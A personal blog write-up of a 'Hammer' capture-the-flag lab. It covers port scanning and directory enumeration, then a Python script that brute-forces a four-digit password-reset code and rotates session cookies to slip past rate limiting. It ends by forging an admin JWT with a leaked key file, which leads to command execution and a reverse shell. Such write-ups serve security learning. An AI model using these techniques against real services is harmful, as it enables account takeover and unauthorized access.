---
created: 2026-10-24
tags:
  - note
  - journal
  - cyberStuff
title: Hammer
date: 2026-10-24T07:06:51.942Z
lastmod: 2026-10-24T10:40:15.527Z
---
first port scan

```
┌──(k㉿kali)-[~]
└─ nmap -p- 10.112.178.233
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-24 10:07 +0300
Stats: 0:00:04 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 23.31% done; ETC: 10:07 (0:00:16 remaining)
Stats: 0:00:05 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 30.72% done; ETC: 10:07 (0:00:14 remaining)
Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 34.25% done; ETC: 10:07 (0:00:12 remaining)
Nmap scan report for 10.112.178.233 (10.112.178.233)
Host is up (0.034s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
1337/tcp open  waste

Nmap done: 1 IP address (1 host up) scanned in 14.61 seconds
```

waster service :

```
WASTE operates as a decentralized peer-to-peer communication network designed to provide secure sharing of files and private messaging among trusted participants. It employs public-private key cryptography and strong encryption to authenticate peers and safeguard data exchanged over the network. Connections are established directly between known users, bypassing centralized servers, which enhances both privacy and resilience against common attack vectors.

Technical communication between WASTE clients typically involves exchanging key fingerprints in advance, creating a web-of-trust model where only verified friends can join the network. The application handles both file transfer and chat functionality over encrypted communication channels. TCP is the primary protocol used, providing reliable delivery of large files and complex data streams essential for its encrypted messaging and file transfers.

Port 1337 is the unofficial default port used by WASTE for these encrypted exchanges. It’s configured by default but can be customized, allowing flexibility but requiring mindful firewall and security rule adjustments to maintain proper functionality. Since there is no centralized directory, participating peers must manually exchange connection details and keys.
```

lets access the http server on the 1337 port\
and we got this :\
![](/images/blog-ul-meu/static/Pasted%20image%2020261024101337.png)\
cool , a login page , and if we inspect the source we see the following :

```
|   |
|---|
||
|<!DOCTYPE html>|
|<html lang="en">|
|<head>|
|<meta charset="UTF-8">|
|<meta name="viewport" content="width=device-width, initial-scale=1.0">|
|<title>Login</title>|
|<link href="[/hmr_css/bootstrap.min.css](http://10.112.178.233:1337/hmr_css/bootstrap.min.css)" rel="stylesheet">|
|<!-- Dev Note: Directory naming convention must be hmr_DIRECTORY_NAME -->|
||
||
|</head>|
|<body>|
|<div class="container mt-5">|
|<div class="row justify-content-center">|
|<div class="col-md-4">|
|<h3 class="text-center">Login</h3>|
|<form method="POST" action="">|
|<div class="mb-3">|
|<label for="email" class="form-label">Email</label>|
|<input type="text" class="form-control" id="email" name="email" required>|
|</div>|
|<div class="mb-3">|
|<label for="password" class="form-label">Password</label>|
|<input type="password" class="form-control" id="password" name="password" required>|
|</div>|
|<button type="submit" class="btn btn-primary w-100">Login</button>|
|<div class="mt-3 text-center">|
|<a href="[reset_password.php](http://10.112.178.233:1337/reset_password.php)">Forgot your password?</a>|
|</div>|
|</form>|
|</div>|
|</div>|
|</div>|
|</body>|
|</html>|
||
```

the interesting part in all this code is `hmr_DIRECTORY_NAME` which is a convention set up by the developer. Based on this we can enumerate subdirectories later.

Source code from reset password page :

```
|   |
|---|
||
|<!DOCTYPE html>|
|<html lang="en">|
|<head>|
|<meta charset="UTF-8">|
|<meta name="viewport" content="width=device-width, initial-scale=1.0">|
|<title>Reset Password</title>|
|<link href="[/hmr_css/bootstrap.min.css](http://10.112.178.233:1337/hmr_css/bootstrap.min.css)" rel="stylesheet">|
|<script src="[/hrm_js/jquery-3.6.0.min.js](http://10.112.178.233:1337/hrm_js/jquery-3.6.0.min.js)"></script>|
|<script>|
|let countdownv = ;|
|function startCountdown() {|
||
|let timerElement = document.getElementById("countdown");|
|const hiddenField = document.getElementById("s");|
|let interval = setInterval(function() {|
|countdownv--;|
|hiddenField.value = countdownv;|
|if (countdownv <= 0) {|
|clearInterval(interval);|
|//alert("hello");|
|window.location.href = 'logout.php';|
|}|
|timerElement.textContent = "You have " + countdownv + " seconds to enter your code.";|
|}, 1000);|
|}|
|</script>|
|</head>|
|<body>|
|<div class="container mt-5">|
|<div class="row justify-content-center">|
|<div class="col-md-4">|
||
|<h3 class="text-center">Reset Password</h3>|
|<form method="POST" action="">|
|<div class="mb-3">|
|<label for="email" class="form-label">Email</label>|
|<input type="text" class="form-control" id="email" name="email" required>|
|</div>|
|<button type="submit" class="btn btn-primary w-100">Submit</button>|
|</form>|
||
|</div>|
|</div>|
|</div>|
|</body>|
|</html>|
||

```

lets create a wordlist with the format specified

```
┌──(k㉿kali)-[~]
└─ cp /usr/share/wordlists/dirb/big.txt .
sed 's/^/hmr_/' big.txt > hmr_big.txt

┌──(k㉿kali)-[~]
└─ gobuster dir -u http://10.112.178.233:1337/ -w hmr_big.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.112.178.233:1337/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                hmr_big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
hmr_css              (Status: 301) [Size: 325] [--> http://10.112.178.233:1337/hmr_css/]
hmr_images           (Status: 301) [Size: 328] [--> http://10.112.178.233:1337/hmr_images/]
hmr_js               (Status: 301) [Size: 324] [--> http://10.112.178.233:1337/hmr_js/]
hmr_logs             (Status: 301) [Size: 326] [--> http://10.112.178.233:1337/hmr_logs/]
Progress: 20469 / 20469 (100.00%)
===============================================================
Finished
===============================================================

┌──(k㉿kali)-[~]
└─
```

and we got a few interesting directories to investigate , one of which is `hmr_log` , in which we can find a `error_log` with this inside:

```
[Mon Aug 19 12:00:01.123456 2024] [core:error] [pid 12345:tid 139999999999999] [client 192.168.1.10:56832] AH00124: Request exceeded the limit of 10 internal redirects due to probable configuration error. Use 'LimitInternalRecursion' to increase the limit if necessary. Use 'LogLevel debug' to get a backtrace.
[Mon Aug 19 12:01:22.987654 2024] [authz_core:error] [pid 12346:tid 139999999999998] [client 192.168.1.15:45918] AH01630: client denied by server configuration: /var/www/html/
[Mon Aug 19 12:02:34.876543 2024] [authz_core:error] [pid 12347:tid 139999999999997] [client 192.168.1.12:37210] AH01631: user tester@hammer.thm: authentication failure for "/restricted-area": Password Mismatch
[Mon Aug 19 12:03:45.765432 2024] [authz_core:error] [pid 12348:tid 139999999999996] [client 192.168.1.20:37254] AH01627: client denied by server configuration: /etc/shadow
[Mon Aug 19 12:04:56.654321 2024] [core:error] [pid 12349:tid 139999999999995] [client 192.168.1.22:38100] AH00037: Symbolic link not allowed or link target not accessible: /var/www/html/protected
[Mon Aug 19 12:05:07.543210 2024] [authz_core:error] [pid 12350:tid 139999999999994] [client 192.168.1.25:46234] AH01627: client denied by server configuration: /home/hammerthm/test.php
[Mon Aug 19 12:06:18.432109 2024] [authz_core:error] [pid 12351:tid 139999999999993] [client 192.168.1.30:40232] AH01617: user tester@hammer.thm: authentication failure for "/admin-login": Invalid email address
[Mon Aug 19 12:07:29.321098 2024] [core:error] [pid 12352:tid 139999999999992] [client 192.168.1.35:42310] AH00124: Request exceeded the limit of 10 internal redirects due to probable configuration error. Use 'LimitInternalRecursion' to increase the limit if necessary. Use 'LogLevel debug' to get a backtrace.
[Mon Aug 19 12:09:51.109876 2024] [core:error] [pid 12354:tid 139999999999990] [client 192.168.1.50:45998] AH00037: Symbolic link not allowed or link target not accessible: /var/www/html/locked-down
```

and we got the email to use for reset password : tester@hammer.thm\
accessing the reset password page we get the following :\
![](/images/blog-ul-meu/static/Pasted%20image%2020261024111846.png)\
te request send with every code :\
![](/images/blog-ul-meu/static/Pasted%20image%2020261024111938.png)\
i tried to brute-force this with but at every only the first ~ 6 requests could pass , the rest where eliminated by a WAF probably.\
![](/images/blog-ul-meu/static/Pasted%20image%2020261024112144.png)\
6req/sec

i lost some time trying to bypass this mechanism in burp but eventually i decided to use this script from[ 0xb0b](https://0xb0b.gitbook.io/writeups) , huge rep+ :

```python
	import subprocess
	
	def get_phpsessid():
	    # Request Password Reset and retrieve the PHPSESSID cookie
	    reset_command = [
	        "curl", "-X", "POST", "http://hammer.thm:1337/reset_password.php",
	        "-d", "email=tester%40hammer.thm",
	        "-H", "Content-Type: application/x-www-form-urlencoded",
	        "-v"
	    ]
	
	    # Execute the curl command and capture the output
	    response = subprocess.run(reset_command, capture_output=True, text=True)
	
	    # Extract PHPSESSID from the response
	    phpsessid = None
	    for line in response.stderr.splitlines():
	        if "Set-Cookie: PHPSESSID=" in line:
	            phpsessid = line.split("PHPSESSID=")[1].split(";")[0]
	            break
	
	    return phpsessid
	
	def submit_recovery_code(phpsessid, recovery_code):
	    # Submit Recovery Code using the retrieved PHPSESSID
	    recovery_command = [
	        "curl", "-X", "POST", "http://hammer.thm:1337/reset_password.php",
	        "-d", f"recovery_code={recovery_code}&s=180",
	        "-H", "Content-Type: application/x-www-form-urlencoded",
	        "-H", f"Cookie: PHPSESSID={phpsessid}",
	        "--silent"
	    ]
	
	    # Execute the curl command for recovery code submission
	    response_recovery = subprocess.run(recovery_command, capture_output=True, text=True)
	    return response_recovery.stdout
	
	def main():
	    phpsessid = get_phpsessid()
	    if not phpsessid:
	        print("Failed to retrieve initial PHPSESSID. Exiting...")
	        return
	    
	    for i in range(10000):
	        recovery_code = f"{i:04d}"  # Format the recovery code as a 4-digit string
	
	        if i % 7 == 0:  # Every 7th request, get a new PHPSESSID
	            phpsessid = get_phpsessid()
	            if not phpsessid:
	                print(f"Failed to retrieve PHPSESSID at attempt {i}. Retrying...")
	                continue
	        
	        response_text = submit_recovery_code(phpsessid, recovery_code)
	        word_count = len(response_text.split())
	
	        if word_count != 148:
	            print(f"Success! Recovery Code: {recovery_code}")
	            print(f"PHPSESSID: {phpsessid}")
	            print(f"Response Text: {response_text}")
	            break
	
	if __name__ == "__main__":
	    main()
	
```

this script basically changes the ssid at every 7 req , so we can brute force.\
it will return a ssid for a session in which we can change the password\
go into your browser and change your ssid to the one returned by the script:\
![](/images/blog-ul-meu/static/Pasted%20image%2020261024114636.png)\
i set mine to :passpass22\
after that we can login to tester@hamer.thm with the pass set by u :\
![](/images/blog-ul-meu/static/Pasted%20image%2020261024114748.png)\
and we got the first flag\
thsi login page is very annoying , it will log out u by itself after some time  , using the jwt, good for us we can modify it.

first ls . u will see a .key file\
download the file with : `curl curl http://hammer.thm:1337/[your_file].key`.\
inside it you will find the secret for the JWT token .\
go to jwt.io , decode your basic token your request , then modify:\
header to :

```
{
  "typ": "JWT",
  "alg": "HS256",
  "kid": "/var/www/html/[your_file].key"
}
```

payload to :

```
{
  "iss": "http://hammer.thm",
  "aud": "http://hammer.thm",
  "iat": 1725193591,
  "exp": 1999999999, // here you can put any values that fit you for a loonger valabity
  "data": {
    "user_id": 1,
    "email": "tester@hammer.thm",
    "role": "admin"
  }
}
```

at sign jwt , put the content we just curled\
then make another log in , intercept the request in burp , and modify both jwt token in the request ,\
![](/images/blog-ul-meu/static/Pasted%20image%2020261024133845.png)\
after that we can execute any command we want  , we can cat the flag inside /home/ubuntu/flag.txt\
or we can get a rev shell using this busybox payload , run leanpeas and play some more.\
![](/images/blog-ul-meu/static/Pasted%20image%2020261024124204.png)
